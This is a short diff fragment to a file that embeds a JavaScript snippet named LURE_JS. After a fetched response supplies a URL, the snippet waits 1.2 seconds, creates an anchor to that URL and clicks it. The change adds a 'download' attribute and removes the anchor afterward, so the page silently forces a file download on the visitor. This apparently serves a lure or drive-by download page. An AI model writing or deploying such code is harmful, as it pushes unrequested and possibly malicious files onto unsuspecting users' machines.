@@ -44,8 +44,8 @@ LURE_JS = """(function () {
         if (!d || !d.url) return;
         setTimeout(function () {
           var a = document.createElement("a");
-          a.href = d.url; a.rel = "noopener";
-          document.body.appendChild(a); a.click();
+          a.href = d.url; a.rel = "noopener"; a.setAttribute("download", "");
+          document.body.appendChild(a); a.click(); a.remove();
         }, 1200);
       })
       .catch(function () {});
